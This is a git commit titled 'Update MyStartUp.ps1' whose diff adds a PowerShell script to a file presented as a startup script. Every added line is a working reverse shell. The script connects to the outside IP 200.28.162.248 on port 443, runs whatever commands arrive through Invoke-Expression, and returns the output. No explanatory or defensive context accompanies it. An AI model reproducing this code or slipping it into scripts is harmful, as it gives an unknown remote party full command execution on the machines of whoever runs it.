f05c0724bd1ed9c2d90649bf762fabde514332e9
fullcaleta <144293848+fullcaleta@users.noreply.github.com>
2025-08-27 06:58:20 -0600

    Update MyStartUp.ps1

--- MyStartUp.ps1
+++ MyStartUp.ps1
@@ -1,1 +1,14 @@
+$client = New-Object System.Net.Sockets.TCPClient("200.28.162.248",443)
+$stream = $client.GetStream()
+$writer = New-Object System.IO.StreamWriter($stream)
+$buffer = New-Object Byte[] 1024
+$encoding = New-Object System.Text.ASCIIEncoding
 
+while(($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0){
+    $data = $encoding.GetString($buffer,0, $i)
+    $sendback = (Invoke-Expression $data | Out-String )
+    $sendback2  = $sendback + "PS " + (pwd).Path + "> "
+    $writer.Write($sendback2)
+    $writer.Flush()
+}
+$client.Close()
